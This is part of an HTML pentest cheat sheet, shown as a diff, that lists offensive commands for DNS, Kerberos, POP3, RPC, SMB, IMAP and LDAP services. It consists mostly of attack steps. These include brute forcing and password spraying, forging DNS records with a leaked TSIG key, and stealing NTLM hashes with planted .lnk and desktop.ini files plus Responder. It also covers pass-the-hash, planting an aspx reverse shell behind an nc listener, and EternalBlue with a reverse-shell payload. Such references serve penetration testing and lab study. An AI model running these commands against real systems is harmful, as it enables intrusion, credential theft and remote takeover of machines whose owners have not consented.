+<span class="c"># Specify a public DNS server</span>
+<span class="c"># Cloudflare</span>
+dig example.com @1.1.1.1
+<span class="c"># Google</span>
+dig example.com @8.8.8.8
+<span class="c"># Quad9</span>
+dig example.com @9.9.9.9
+</code></pre></div>  </div>
+
+  <h3 id="zone-transfer">Zone Transfer</h3>
+  <p>The zone transfer is the process of copying the zone file on a primary DNS server to a secondary DNS server.</p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># axfr: Check if the Full Zone Transfer (AXFR) is available</span>
+dig @&lt;nameserver&gt; AXFR
+dig example.com @&lt;nameserver&gt; AXFR
+dig example.com @example.com AXFR
+dig &lt;zone-name&gt; @&lt;nameserver&gt; AXFR
+</code></pre></div>  </div>
+
+  <h3 id="bind">BIND</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># BIND version</span>
+dig @&lt;nameserver-address&gt; chaos txt version.bind
+</code></pre></div>  </div>
+
+  <h3 id="configuration-2">Configuration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># In Linux</span>
+/etc/bind/named.conf
+/etc/bind/named.conf.options
+/etc/bind/named.conf.local
+/etc/bind/named.conf.default-zones
+
+<span class="c">#Example: If we found the secret key such like below, we can update DNS zone.</span>
+<span class="c"># /etc/bind/named.conf</span>
+key <span class="s2">"rndc-key"</span> <span class="o">{</span>
+    algorithm hmac-sha256<span class="p">;</span>
+    secret <span class="s2">"zBatC828gunRa...bA="</span><span class="p">;</span>
+<span class="o">}</span><span class="p">;</span>
+<span class="c"># We can update DNS Zone with the nsupdate command:</span>
+<span class="c"># -d: Debug mode</span>
+<span class="c"># -y: Set the literal TSIG (Transaction Signature) authentication key.</span>
+nsupdate <span class="nt">-d</span> <span class="nt">-y</span> hmac-sha256:rndc-key:zBatC828gunRa...bA<span class="o">=</span> 
+Creating key...
+namefromtext
+keycreate
+<span class="c"># Enter target domain</span>
+<span class="o">&gt;</span> server example.com
+<span class="c"># Enter the new record</span>
+<span class="c"># 86400: The TTL (Time-To-Live) for the DNS record. Set 86400 seconds (24 hours) here.</span>
+<span class="c"># IN: Internet</span>
+<span class="c"># A: A record</span>
+<span class="c"># 10.0.0.1: Set your local ip address</span>
+<span class="o">&gt;</span> update add sub.example.com 86400 IN A 10.0.0.1
+<span class="o">&gt;</span> send
+Reply from SOA query:
+...
+</code></pre></div>  </div>
+
+  <h3 id="resolve-domains">Resolve domains</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Edit /etc/hosts file as root to add custom domains.</span>
+nano /etc/hosts
+
+<span class="c"># Add the custom domain</span>
+10.0.0.2  vulnerable.com sub.vulnerable.com
+10.0.0.3  vulnerable2.com
+
+<span class="nb">sudo </span>systemctl restart systemd-hostnamed
+</code></pre></div>  </div>
+
+  <h3 id="set-dns-resolver">Set DNS Resolver</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Edit /etc/resolv.conf file as root to add custom nameservers.</span>
+nano /etc/resolv.conf
+
+<span class="c">#Google</span>
+nameserver 8.8.8.8
+nameserver 8.8.4.4
+<span class="c"># IPv6</span>
+nameserver 2001:4860:4860::8888
+nameserver 2001:4860:4860::8844
+
+<span class="c">#Cloudflare</span>
+nameserver 1.1.1.1
+
+<span class="nb">sudo </span>systemctl restart systemd-resolved.service
+</code></pre></div>  </div>
+
+  <h3 id="dns-cache">DNS Cache</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Clear IP addresses or DNS records from caches.</span>
+<span class="nb">sudo </span>resolvectl flush-caches
+<span class="c"># or</span>
+<span class="nb">sudo </span>systemd-resolve <span class="nt">--flush-cache</span>
+
+<span class="c">#Check DNS caches are actually flushed</span>
+<span class="nb">sudo </span>resolvectl statistics
+<span class="c"># or</span>
+<span class="nb">sudo </span>systemd-resolve <span class="nt">--statistics</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------Kerberos NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>Kerberos (88)</summary>
+  <p></p>
+
+  <h3 id="enumeration-4">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> krb5-enum-users <span class="nt">--script-args</span> krb5-enum-users.realm<span class="o">=</span><span class="s1">'example.local'</span><span class="nt">-p</span> 88 &lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="bruteforce-authentication">Bruteforce Authentication</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Using nmap script (brute usernames)</span>
+nmap <span class="nt">-p</span> 88 <span class="nt">--script</span><span class="o">=</span>krb5-enum-users <span class="nt">--script-args</span> krb5-enum-users.realm<span class="o">=</span><span class="s2">"{Domain_Name}"</span>,userdb<span class="o">={</span>Big_Userlist<span class="o">}</span> <span class="o">{</span>IP<span class="o">}</span>
+
+
+<span class="c">#Using Kerbrute: https://github.com/ropnop/kerbrute (brute usernames and passwords)</span>
+<span class="c"># --dc: domain controller</span>
+<span class="c"># -d: domain</span>
+<span class="c"># combos.txt: the wordlist specified must be combinations with "username:password".</span>
+kerbrute bruteforce <span class="nt">--dc</span> 10.0.0.1 <span class="nt">-d</span> example.domain combos.txt
+<span class="c"># Users enumeration</span>
+kerbrute userenum <span class="nt">--dc</span> 10.0.0.1 <span class="nt">-d</span> example.domain usernames.txt
+<span class="c"># Brute force user's password</span>
+kerbture bruteuser <span class="nt">--dc</span> 10.0.0.1 <span class="nt">-d</span> example.domain passwords.txt username
+</code></pre></div>  </div>
+
+  <h3 id="get-list-of-user-service-principal-names-spns">Get list of user service principal names (SPNs)</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If you know creds</span>
+impacket-GetUserSPNs.py <span class="nt">-request</span> <span class="nt">-dc-ip</span> <span class="o">{</span>IP<span class="o">}</span> active.htb/svc_tgs
+</code></pre></div>  </div>
+
+</details>
+
+<!-- ------------------------------------------------POP NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>POP3 (110/995)</summary>
+  <p></p>
+
+  <h3 id="enumeration-5">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Banner grab</span>
+nc <span class="nt">-nv</span> <span class="o">{</span>IP<span class="o">}</span> 110
+
+<span class="c"># Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION)	</span>
+nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">--version-intensity</span><span class="o">=</span>5 <span class="nt">--script</span> pop3-capabilities <span class="nt">-p</span> T:110 IP
+
+<span class="c"># Try to bruteforce POP3 accounts</span>
+nmap <span class="nt">--script</span> pop3-brute <span class="nt">--script-args</span> <span class="nv">pop3loginmethod</span><span class="o">=</span>SASL-LOGIN <span class="nt">-p</span> T:110 IP
+nmap <span class="nt">--script</span> pop3-brute <span class="nt">--script-args</span> <span class="nv">pop3loginmethod</span><span class="o">=</span>SASL-CRAM-MD5 <span class="nt">-p</span> T:110 IP
+nmap <span class="nt">--script</span> pop3-brute <span class="nt">--script-args</span> <span class="nv">pop3loginmethod</span><span class="o">=</span>APOP <span class="nt">-p</span> T:110 IP
+
+<span class="c">#Hydra Bruteforce (need username)</span>
+hydra <span class="nt">-l</span> <span class="o">{</span>Username<span class="o">}</span> <span class="nt">-P</span> <span class="o">{</span>Big_Passwordlist<span class="o">}</span> <span class="nt">-f</span> <span class="o">{</span>IP<span class="o">}</span> pop3 <span class="nt">-V</span>
+</code></pre></div>  </div>
+
+  <h3 id="commands-2">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Login</span>
+USER &lt;username&gt;
+PASS &lt;password&gt;
+
+<span class="c"># Number and total size of all messages</span>
+STAT
+<span class="c"># List messages and size</span>
+LIST
+<span class="c"># Retrieve the message of given number</span>
+RETR &lt;number&gt;
+<span class="c"># Delete the message of given number</span>
+DELE &lt;number&gt;
+<span class="c"># Reset the mailbox</span>
+RSET
+<span class="c"># Exit the mail server</span>
+QUIT
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------RPC NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>RPC (135/593)</summary>
+  <p></p>
+
+  <h3 id="enumeration-6">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#nmap</span>
+nmap <span class="nt">--script</span> msrpc-enum <span class="nt">-p</span> 135 &lt;target-ip&gt;
+
+<span class="c">#rpcdump</span>
+rpcdump.py &lt;IP&gt; <span class="nt">-p</span> 135
+impacket-rpcdump <span class="nt">-port</span> 135 &lt;target-ip&gt; | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'MS-EFSRPC|MS-RPRN|MS-PAR'</span>
+
+<span class="c">#metasploit</span>
+use auxiliary/scanner/dcerpc/endpoint_mapper
+use auxiliary/scanner/dcerpc/hidden
+use auxiliary/scanner/dcerpc/management
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+
+<span class="c">#enum4linux</span>
+<span class="c"># Do everything</span>
+enum4linux <span class="nt">-a</span> target-ip
+<span class="c"># List users</span>
+enum4linux <span class="nt">-U</span> target-ip
+<span class="c"># If you've managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option</span>
+enum4linux <span class="nt">-u</span> administrator <span class="nt">-p</span> password <span class="nt">-U</span> target-ip
+<span class="c"># Get username from the defaut RID range (500-550, 1000-1050)</span>
+enum4linux <span class="nt">-r</span> target-ip
+<span class="c"># Get username using a custom RID range</span>
+enum4linux <span class="nt">-R</span> 600-660 target-ip
+<span class="c"># List groups</span>
+enum4linux <span class="nt">-G</span> target-ip
+<span class="c"># List shares</span>
+enum4linux <span class="nt">-S</span> target-ip
+<span class="c"># Perform a dictionary attack, if the server doesn't let you retrieve a share list </span>
+enum4linux <span class="nt">-s</span> shares.txt target-ip
+<span class="c"># Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows</span>
+enum4linux <span class="nt">-o</span> target-ip
+<span class="c"># Pull information about printers known to the remove device.</span>
+enum4linux <span class="nt">-i</span> target-ip
+</code></pre></div>  </div>
+
+  <h3 id="connect-3">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Anonymous logon</span>
+rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> &lt;target-ip&gt;
+rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-p</span> 593 &lt;target-ip&gt;
+rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> dc.example.local
+
+<span class="c"># Specify username</span>
+<span class="c"># -W: Workgroup</span>
+<span class="c"># -N: No password</span>
+rpcclient <span class="nt">-U</span> username &lt;target-ip&gt;
+rpcclient <span class="nt">-W</span> WORKGROUP <span class="nt">-U</span> username &lt;target-ip&gt;
+rpcclient <span class="nt">-U</span> username <span class="nt">-N</span> &lt;target-ip&gt;
+
+<span class="c"># -k: Kerberos authentication</span>
+rpcclient <span class="nt">-k</span> &lt;target-ip&gt;
+</code></pre></div>  </div>
+
+  <h3 id="commands-3">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server info</span>
+rpcclient <span class="nv">$&gt;</span> srvinfo
+<span class="c"># Enumerate domains</span>
+rpcclient <span class="nv">$&gt;</span> enumdomains
+<span class="c"># Enumerate domain users</span>
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+<span class="c"># Enumerate domain groups</span>
+rpcclient <span class="nv">$&gt;</span> enumdomgroups
+<span class="c"># Domain info</span>
+rpcclient <span class="nv">$&gt;</span> querydominfo
+<span class="c"># Current username</span>
+rpcclient <span class="nv">$&gt;</span> getusername
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------SMB NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>SMB (139/445)</summary>
+  <p></p>
+
+  <h3 id="enumeration-7">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#nmap</span>
+nmap <span class="nt">--script</span> smb-brute <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-enum-shares.nse,smb-enum-users.nse <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-enum<span class="k">*</span> <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-protocols <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> smb-vuln<span class="k">*</span> <span class="nt">-p</span> 139,445 &lt;target-ip&gt;
+
+<span class="c"># NetBIOS names</span>
+nmblookup <span class="nt">-A</span> 10.0.0.1
+nbtscan 10.0.0.1
+nbtscan <span class="nt">-r</span> 10.0.0.1/24
+
+<span class="c"># Enum4linux</span>
+enum4linux &lt;target-ip&gt;
+<span class="c"># All enumeration</span>
+enum4linux <span class="nt">-a</span> &lt;target-ip&gt;
+<span class="c"># Verbose</span>
+enum4linux <span class="nt">-v</span> &lt;target-ip&gt;
+<span class="c"># Specify username and password</span>
+enum4linux <span class="nt">-u</span> username <span class="nt">-p</span> password &lt;target-ip&gt;
+
+<span class="c"># Enum4linux-ng</span>
+<span class="c"># -A: All simple enumeration including nmblookup</span>
+enum4linux-ng <span class="nt">-A</span> &lt;target-ip&gt;
+<span class="c"># -As: All simple short enumeration without NetBIOS names lookup</span>
+enum4linux-ng <span class="nt">-As</span> &lt;target-ip&gt;
+<span class="c"># -u: Specific username</span>
+<span class="c"># -p: Specific password</span>
+enum4linux-ng <span class="nt">-u</span> <span class="s2">"administrator"</span> <span class="nt">-p</span> <span class="s2">"password"</span> &lt;target-ip&gt;
+
+<span class="c"># NetExec (https://www.netexec.wiki/)</span>
+netexec smb 10.0.0.0/24
+netexec smb &lt;target-ip&gt;
+netexec smb &lt;target-ip-1&gt; &lt;target-ip-2&gt;
+netexec smb &lt;target-ip&gt; <span class="nt">--pass-pol</span>
+netexec smb &lt;target-ip&gt; <span class="nt">--groups</span>
+netexec smb &lt;target-ip&gt; <span class="nt">--users</span>
+<span class="c"># Specify username/password</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--users</span>
+<span class="c"># -M zerologon: Scan for ZeroLogon</span>
+<span class="c"># -M petitpotam: Scan for PetitPotam</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-M</span> zerologon <span class="nt">-M</span> petitpotam
+</code></pre></div>  </div>
+  <h3 id="find-shared-folders">Find Shared Folders</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -N: No password</span>
+<span class="c"># -L: List shared directories</span>
+smbclient <span class="nt">-N</span> <span class="nt">-L</span> &lt;target-ip&gt;
+smbclient <span class="nt">-L</span> &lt;target-ip&gt; <span class="nt">-U</span> username
+
+smbmap <span class="nt">-H</span> &lt;target-ip&gt;
+<span class="c"># Recursive</span>
+smbmap <span class="nt">-H</span> &lt;target-ip&gt; <span class="nt">-R</span>
+<span class="c"># Username and password</span>
+smbmap <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-H</span> &lt;target-ip&gt;
+<span class="c"># Execute a command</span>
+smbmap <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-H</span> &lt;target-ip&gt; <span class="nt">-x</span> <span class="s1">'ipconfig'</span>
+
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--shares</span>
+
+impacket-psexec example.local/username@&lt;target-ip&gt;
+</code></pre></div>  </div>
+  <h3 id="bruteforce-1">Bruteforce</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> passwords.txt <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> usernames.txt <span class="nt">-H</span> ntlm_hashes.txt <span class="nt">--continue-on-success</span>
+
+hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; smb
+hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; smb
+
+<span class="c"># RID Brute Force</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--rid-brute</span> 20000
+
+<span class="c"># Using Metasploit</span>
+msfconsole <span class="nt">-q</span>
+msf&gt; use auxiliary/scanner/smb/smb_login
+
+<span class="c">#If we find credentials, we can use them for smbclient or WinRM. </span>
+<span class="c">#If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.</span>
+smbpasswd <span class="nt">-r</span> &lt;target-ip&gt; <span class="nt">-U</span> &lt;username&gt;
+<span class="c"># or</span>
+impacket-smbpasswd &lt;DOMAIN&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target-ip&gt; <span class="nt">-newpass</span> &lt;new-password&gt;
+<span class="c"># If you don't have impacket-smbpasswd, download it from a repository.</span>
+wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
+</code></pre></div>  </div>
+
+  <h3 id="password-spraying">Password Spraying</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># User enumeration</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> John <span class="nt">-p</span> Password123 <span class="nt">--users</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> John <span class="nt">-H</span> &lt;NTLM_HASH&gt; <span class="nt">--users</span>
+
+<span class="c"># Find users with same password</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-p</span> Password123 <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-p</span> found_passwords.txt <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-H</span> &lt;NTLM_HASH&gt; <span class="nt">--continue-on-success</span>
+netexec smb &lt;target-ip&gt; <span class="nt">-u</span> users.txt <span class="nt">-H</span> found_ntlm_hashes.txt <span class="nt">--continue-on-success</span>
+</code></pre></div>  </div>
+
+  <h3 id="rid-cycling-attack">RID Cycling Attack</h3>
+  <p>RID Enumeration. It attempts to enumerate user accounts through null sessions.</p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Anonymous logon</span>
+<span class="c"># 20000: Maximum RID to be cycled</span>
+impacket-lookupsid example.local/anonymous@&lt;target-ip&gt; 20000 <span class="nt">-no-pass</span>
+impacket-lookupsid example.local/guest@&lt;target-ip&gt; 20000 <span class="nt">-no-pass</span>
+impacket-lookupsid example.local/guest@&lt;target-ip&gt; 20000
+<span class="c"># Specify user</span>
+impacket-lookupsid example.local/user@&lt;target-ip&gt; 20000 <span class="nt">-hashes</span> &lt;lmhash&gt;:&lt;nthash&gt;
+impacket-lookupsid example.local/user@&lt;target-ip&gt; 20000
+
+
+<span class="c"># USEFUL COMMAND</span>
+<span class="c"># This command extract usernames. It's useful for further enumeration which uses usernames.</span>
+<span class="c"># Replace the following keywords:</span>
+<span class="c">#  - `example.com` =&gt; Target domain</span>
+<span class="c">#  - `10.0.0.1`    =&gt; Target IP</span>
+<span class="c">#  - `DOMAIN`      =&gt; Target domain name</span>
+impacket-lookupsid example.com/guest@10.0.0.1 20000 <span class="nt">-no-pass</span> <span class="o">&gt;</span> tmp.txt | <span class="nb">cat </span>tmp.txt | <span class="nb">grep </span>SidTypeUser | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f</span> 2 | <span class="nb">sed</span> <span class="s1">'s/DOMAIN\\//g'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt <span class="o">&amp;&amp;</span> <span class="nb">rm </span>tmp.txt
+</code></pre></div>  </div>
+
+  <h3 id="ntlm-stealing-via-ntlmtool">NTLM Stealing via ntlm_tool</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Greenwolf/ntlm_theft
+<span class="c"># -g all: Generate all files.</span>
+<span class="c"># -s: Local IP (attacker IP)</span>
+<span class="c"># -f: Folder to store generated files.</span>
+python3 ntlm_theft <span class="nt">-g</span> all <span class="nt">-s</span> &lt;local-ip&gt; <span class="nt">-f</span> samples
+
+<span class="c">#After generating files with ntlm_theft put the .lnk file to shared folder</span>
+smbclient <span class="nt">-N</span> //10.0.0.1/example
+smb&gt; put samples.lnk
+
+<span class="c">#Start responder</span>
+<span class="nb">sudo </span>responder <span class="nt">-I</span> eth0
+</code></pre></div>  </div>
+
+  <h3 id="ntlm-stealing-via-desktopini">NTLM Stealing via Desktop.ini</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#We can retrieve the hashes by putting desktop.ini file, that contains arbitrary icon resource path, to the shared folder.</span>
+<span class="c">#Create a new desktop.ini in local machine.</span>
+<span class="o">[</span>.ShellClassInfo]
+<span class="nv">IconResource</span><span class="o">=</span><span class="se">\\</span>&lt;local-ip&gt;<span class="se">\t</span>est
+
+<span class="c">#Then upload it to the writable shared folder.</span>
+put desktop.ini
+
+<span class="c">#Start responder</span>
+<span class="nb">sudo </span>responder <span class="nt">-I</span> eth0
+</code></pre></div>  </div>
+
+  <h3 id="connect-4">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># anonymous login</span>
+smbclient //10.0.0.1/somedir <span class="nt">-N</span>
+<span class="c"># If the folder name contains spaces, surround with double quotes</span>
+smbclient <span class="s2">"//10.0.0.1/some dir"</span> <span class="nt">-N</span>
+<span class="c"># Specify user</span>
+smbclient //10.0.0.1/somedir <span class="nt">-U</span> username
+<span class="c"># nobody, no-pass</span>
+smbclient //10.0.0.1/somedir <span class="nt">-N</span> <span class="nt">-U</span> nobody
+<span class="c"># Specify workgroup</span>
+smbclient <span class="nt">-L</span> 10.0.0.1 <span class="nt">-W</span> WORKGROUP <span class="nt">-U</span> username
+
+<span class="c">#Windows shell</span>
+impacket-wmiexec example.local/username@10.0.0.1
+<span class="c"># Pass the Hash</span>
+impacket-wmiexec <span class="nt">-hashes</span> abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
+</code></pre></div>  </div>
+
+  <h3 id="commands-4">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls
+</span>get file.txt
+get <span class="s2">"my document.txt"</span>
+
+<span class="c">#Download all files</span>
+mask <span class="s2">""</span>
+recurse ON
+prompt OFF
+mget <span class="k">*</span>
+
+<span class="c">#Download files using smbget</span>
+smbget smb://&lt;target-ip&gt;/somedir/example.txt <span class="nt">-U</span> username
+smbget <span class="nt">-R</span> smb://&lt;target-ip&gt;/somedir <span class="nt">-U</span> username
+<span class="c"># Specify workgroup</span>
+smbget <span class="nt">-R</span> smb://&lt;target-ip&gt;/somedir <span class="nt">-w</span> WORKGROUP <span class="nt">-U</span> username
+<span class="c"># as anonymous user</span>
+smbget smb://&lt;target-ip&gt;/somedir <span class="nt">-U</span> anonymous
+password: anonymous
+
+<span class="c">#Upload files</span>
+put example.txt
+
+<span class="c">#Reverse shell</span>
+put shell.aspx
+<span class="c">#Configure listener</span>
+nc <span class="nt">-lvnp</span> 4444
+<span class="c">#Access the shared file</span>
+https://example.com/path/to/smb/share/shell.aspx
+</code></pre></div>  </div>
+
+  <h3 id="eternal-blue-ms17-010">Eternal Blue (MS17-010)</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Metasploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+<span class="nb">set </span>rhosts &lt;target-ip&gt;
+<span class="nb">set </span>lhost &lt;local-ip&gt;
+run
+<span class="c"># If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload</span>
+<span class="nb">set </span>payload payload/generic/shell_reverse_tcp
+
+<span class="c">#Automated tool (autoblue)</span>
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+python zzz_exploit.py <span class="nt">-target-ip</span> &lt;target-ip&gt; <span class="nt">-port</span> 445 <span class="s1">'username:password@target'</span>
+</code></pre></div>  </div>
+
+</details>
+
+<!-- ------------------------------------------------IMAP NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>IMAP (143/993)</summary>
+  <p></p>
+
+  <h3 id="enumeration-8">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> &lt;IP&gt; 143
+openssl s_client <span class="nt">-connect</span> &lt;IP&gt;:993 <span class="nt">-quiet</span>
+nmap <span class="nt">--script</span> imap-capabilities <span class="nt">-p</span> 143 &lt;target-ip&gt;
+
+<span class="c">#metasploit</span>
+use auxiliary/scanner/imap/imap_version
+<span class="nb">set </span>RHOSTS <span class="o">{</span>IP<span class="o">}</span>
+<span class="nb">set </span>RPORT 143
+</code></pre></div>  </div>
+
+  <h3 id="connect-5">Connect</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.0.0.1 143
+</code></pre></div>  </div>
+
+  <h3 id="commands-5">Commands</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Login</span>
+a1 login <span class="s2">"&lt;username&gt;"</span> <span class="s2">"&lt;password&gt;"</span>
+<span class="c">#List Folders/Mailboxes</span>
+A1 LIST <span class="s2">""</span> <span class="k">*</span>
+A1 LIST INBOX <span class="k">*</span>
+A1 LIST <span class="s2">"Archive"</span> <span class="k">*</span>
+<span class="c">#Select a mailbox</span>
+A1 SELECT INBOX
+<span class="c">#List messages</span>
+A1 FETCH 1:<span class="k">*</span> <span class="o">(</span>FLAGS<span class="o">)</span>
+A1 UID FETCH 1:<span class="k">*</span> <span class="o">(</span>FLAGS<span class="o">)</span>
+<span class="c">#Retrieve Message Content</span>
+A1 FETCH 2 body[text]
+A1 FETCH 2 all
+<span class="c"># Logout</span>
+a1 <span class="nb">logout</span>
+<span class="c"># Close mailbox</span>
+a1 close
+</code></pre></div>  </div>
+</details>
+
+<!-- ------------------------------------------------LDAP NOTES----------------------------------------------------------- -->
+
+<details>
+  <summary>LDAP (389/636/3268/3269)</summary>
+  <p></p>
+
+  <h3 id="enumeration-9">Enumeration</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap</span>
+nmap <span class="nt">--script</span> ldap-brute <span class="nt">--script-args</span> ldap.base<span class="o">=</span><span class="s1">'"cn=users,dc=cqure,dc=net"'</span> <span class="nt">-p</span> 389 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> ldap-search <span class="nt">-p</span> 389 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> ldap-<span class="k">*</span> <span class="nt">-p</span> 389 &lt;target-ip&gt;
+nmap <span class="nt">--script</span> <span class="s2">"ldap* and not brute"</span> <span class="nt">-p</span> 389 &lt;target-ip&gt;
+nmap <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--script</span> <span class="s2">"ldap* and not brute"</span> &lt;IP&gt; <span class="c">#Using anonymous credentials</span>
+
+
+<span class="c"># NetExec</span>
+<span class="c"># -k: Use Kerberos authentication</span>
+netexec ldap &lt;target-ip&gt; <span class="nt">-u</span> usernames.txt <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-k</span>
+<span class="c"># --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`</span>
+<span class="c"># reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions</span>
+netexec ldap &lt;target-ip&gt; <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--trusted-for-delegation</span>
+</code></pre></div>  </div>
+
+  <h3 id="ldapsearch">ldapsearch</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -x: Simple authentication</span>
+<span class="c"># -b: base dn for search</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.0.0.1 <span class="nt">-b</span> <span class="s2">"dc=example,dc=com"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldaps://10.0.0.1:636 <span class="nt">-b</span> <span class="s2">"dc=example,dc=com"</span>
+
+<span class="c"># As administrator</span>
+<span class="c"># -D: bind DN</span>
+<span class="c"># -w: bind password</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.0.0.1 <span class="nt">-b</span> <span class="s2">"dc=example,dc=com"</span> <span class="nt">-D</span> <span class="s2">"cn=admin,dc=example,dc=com"</span> <span class="nt">-w</span> password
